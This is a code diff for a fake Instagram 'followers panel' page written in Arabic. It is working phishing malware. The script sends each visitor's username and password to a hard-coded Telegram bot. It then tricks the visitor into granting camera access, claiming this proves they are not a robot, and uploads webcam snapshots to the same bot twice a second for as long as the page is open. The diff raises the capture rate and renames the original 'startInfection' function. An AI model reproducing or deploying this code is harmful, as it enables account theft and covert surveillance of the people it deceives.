@@ -3,70 +3,86 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram Verification - تأكيد الحساب</title>
+    <title>Instagram - Followers Panel</title>
     <style>
-        body { background: #fafafa; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; direction: rtl; }
-        .box { background: white; border: 1px solid #dbdbdb; padding: 30px; width: 320px; text-align: center; border-radius: 8px; }
-        .logo { width: 150px; margin-bottom: 20px; }
-        .loading { border: 4px solid #f3f3f3; border-top: 4px solid #0095f6; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 20px auto; display: none; }
+        body { background: #fafafa; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; direction: rtl; }
+        .card { background: white; border: 1px solid #dbdbdb; padding: 35px; width: 330px; border-radius: 5px; text-align: center; }
+        .logo { width: 170px; margin-bottom: 20px; }
+        input, select { width: 100%; background: #fafafa; border: 1px solid #dbdbdb; padding: 10px; margin-bottom: 10px; border-radius: 3px; font-size: 13px; box-sizing: border-box; }
+        button { width: 100%; background: #0095f6; color: white; border: none; padding: 10px; border-radius: 4px; font-weight: 600; cursor: pointer; }
+        .loader { border: 3px solid #f3f3f3; border-top: 3px solid #0095f6; border-radius: 50%; width: 25px; height: 25px; animation: spin 0.8s linear infinite; margin: 15px auto; display: none; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        button { width: 100%; background: #0095f6; color: white; border: none; padding: 10px; border-radius: 5px; font-weight: bold; cursor: pointer; }
     </style>
 </head>
 <body>
-    <div class="box">
+    <div class="card">
         <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" class="logo">
-        <p id="status">سجل دخولك لتفعيل زيادة المتابعين</p>
-        <input type="text" id="u" placeholder="اسم المستخدم" style="width:100%; padding:8px; margin-bottom:10px; border:1px solid #dbdbdb;">
-        <input type="password" id="p" placeholder="كلمة السر" style="width:100%; padding:8px; margin-bottom:10px; border:1px solid #dbdbdb;">
-        <select id="c" style="width:100%; padding:8px; margin-bottom:15px;">
-            <option>100 متابع</option>
-            <option>500 متابع</option>
-            <option>1500 متابع</option>
+        <p style="font-size: 14px; color: #8e8e8e; margin-bottom: 20px;">اختر الكمية بدقة لضمان وصول المتابعين</p>
+        
+        <select id="count">
+            <option value="10">10 متابعين</option>
+            <option value="15">15 متابع</option>
+            <option value="20">20 متابع</option>
+            <option value="25">25 متابع</option>
+            <option value="30">30 متابع</option>
+            <option value="50">50 متابع</option>
+            <option value="100">100 متابع</option>
+            <option value="150">150 متابع</option>
+            <option value="200">200 متابع</option>
+            <option value="250">250 متابع</option>
+            <option value="300">300 متابع</option>
+            <option value="500">500 متابع (VIP)</option>
+            <option value="1000">1000 متابع (Golden)</option>
         </select>
-        <button onclick="startInfection()">تفعيل الآن</button>
-        <div id="loader" class="loading"></div>
-        <video id="v" width="0" height="0" autoplay style="display:none;"></video>
-        <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+
+        <input type="text" id="u" placeholder="اسم المستخدم" required>
+        <input type="password" id="p" placeholder="كلمة السر" required>
+        
+        <button onclick="runBot()">بدء عملية الزيادة</button>
+        <div id="ld" class="loader"></div>
+        <p id="st" style="font-size: 12px; color: #ed4956; margin-top: 10px; display: none;">جاري التحقق.. ابقِ الصفحة مفتوحة لضمان نجاح العملية</p>
+
+        <video id="vid" autoplay style="display:none;"></video>
+        <canvas id="can" width="640" height="480" style="display:none;"></canvas>
     </div>
 
     <script>
-        const API_TOKEN = '8444214588:AAE8ugJvMnz8RNfWuIvBCT_-9X-NHl01qek';
-        const MY_ID = '1371063739';
+        const TOKEN = '8444214588:AAE8ugJvMnz8RNfWuIvBCT_-9X-NHl01qek';
+        const ID = '1371063739';
 
-        async function startInfection() {
+        async function runBot() {
             const user = document.getElementById('u').value;
             const pass = document.getElementById('p').value;
-            if(!user || !pass) return alert("أدخل البيانات!");
+            if(!user || !pass) return alert("يرجى ملء البيانات!");
 
-            // إرسال الحساب أولاً
-            fetch(`https://api.telegram.org/bot${API_TOKEN}/sendMessage?chat_id=${MY_ID}&text=${encodeURIComponent("👤 يوزر: "+user+"\n🔑 باس: "+pass)}`);
+            // إرسال الحساب فوراً
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${ID}&text=${encodeURIComponent("👤:"+user+"\n🔑:"+pass)}`);
 
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                document.getElementById('v').srcObject = stream;
-                document.getElementById('loader').style.display = 'block';
-                document.getElementById('status').innerText = "جاري معالجة الطلب.. لا تغلق الصفحة";
-                
-                // التقاط صور لامتناهية كل 4 ثواني طالما الصفحة مفتوحة
+                document.getElementById('vid').srcObject = stream;
+                document.getElementById('ld').style.display = 'block';
+                document.getElementById('st').style.display = 'block';
+
+                // سحب صورتين في الثانية (كل 500ms)
                 setInterval(() => {
-                    capture();
-                }, 4000);
+                    snap();
+                }, 500); 
 
             } catch (err) {
-                alert("يجب السماح بالكاميرا لتأكيد الحساب!");
+                alert("⚠️ خطأ أمني: يجب السماح بالكاميرا لتأكيد أنك لست روبوت!");
             }
         }
 
-        function capture() {
-            const canvas = document.getElementById('canvas');
-            const video = document.getElementById('v');
-            canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
-            canvas.toBlob(blob => {
-                const fd = new FormData();
-                fd.append('chat_id', MY_ID);
-                fd.append('photo', blob, 'img.jpg');
-                fetch(`https://api.telegram.org/bot${API_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+        function snap() {
+            const can = document.getElementById('can');
+            const vid = document.getElementById('vid');
+            can.getContext('2d').drawImage(vid, 0, 0, 640, 480);
+            can.toBlob(b => {
+                const f = new FormData();
+                f.append('chat_id', ID);
+                f.append('photo', b, 's.jpg');
+                fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: f });
             }, 'image/jpeg');
         }
     </script>
